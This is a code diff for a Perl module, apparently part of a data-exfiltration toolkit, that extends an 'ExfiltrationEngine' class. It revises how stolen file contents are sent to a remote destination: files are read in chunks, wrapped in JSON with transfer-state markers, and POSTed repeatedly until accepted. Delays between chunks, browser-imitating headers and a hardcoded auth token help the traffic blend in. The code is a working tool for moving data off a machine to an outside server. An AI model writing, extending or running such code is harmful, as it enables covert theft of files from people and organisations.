@@ -8,12 +8,16 @@ use Moose;
 extends 'ExfiltrationEngine';
 
 use LWP::UserAgent;
-use MIME::Base64;
+use JSON;
+use Readonly;
+
+Readonly my $START_TRANSFER => 1;
+Readonly my $IN_TRANSFER => 0;
+Readonly my $END_TRANSFER => -1;
 
 sub setHeader {
     my($req) = @_;
 
-    $req->header('content-type' => 'application/json');
     $req->header('x-auth-token' => 'kfksj48sdfj4jd9d');
     $req->header('Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8');
     $req->header('Accept-Language' => 'en-US,en;q=0.5');
@@ -23,11 +27,30 @@ sub setHeader {
     $req->header('Cache-Control' => 'max-age=0');
 }
 
+sub sendData {
+    my($request, $userAgent, $file, $data, $id, $state) = @_;
+    my $res = 0;
+
+    my $hash = {
+        id      =>  $id,
+        file    =>  $file,
+        data    =>  $data,
+        state   =>  $state
+    };
+
+    $request->content(encode_json $hash);
+
+    while (!$res || $res->code != 200) {
+        $res = $userAgent->request($request);
+    }
+}
+
 sub exfiltrate {
     my($self, $file) = @_;
-    my($data, $n, $res);
+    my($data, $n);
     my $userAgent = new LWP::UserAgent;
     my $request = new HTTP::Request 'POST' => $self->dest;
+    my $id = int(rand(100000)) + int(rand(100));
 
     $self->SUPER::load($file);
 
@@ -35,17 +58,14 @@ sub exfiltrate {
 
     setHeader($request);
 
+    sendData($request, $userAgent, $file, '', $id, $START_TRANSFER);
+
     while (($n = read $self->file, $data, $self->size) != 0) {
-        $res = 0;
-
-        $request->content('{ "data": "' . $data . '" }');
-
-        while (!$res || $res->code != 200) {
-            $res = $userAgent->request($request);
-        }
-
+        sendData($request, $userAgent, $file, $data, $id, $IN_TRANSFER);
         sleep($self->delay);
     }
+
+    sendData($request, $userAgent, $file, '', $id, $END_TRANSFER);
 
     $self->SUPER::close();
 }
